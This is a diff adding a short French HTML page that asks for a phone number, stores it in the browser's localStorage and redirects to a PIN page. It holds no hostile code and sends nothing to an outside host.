@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Numéro</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="page">
+
+<h2>Entrez votre numéro</h2>
+
+<input type="number" id="phone" placeholder="Numéro">
+
+<br><br>
+
+<button onclick="next()">Continuer</button>
+
+<script>
+function next() {
+    const phone = document.getElementById("phone").value;
+
+    if (!phone) {
+        alert("Numéro obligatoire");
+        return;
+    }
+    localStorage.setItem("phone", phone);
+    window.location.href = "pin.html";
+}
+</script>
+
+</body>
+</html>
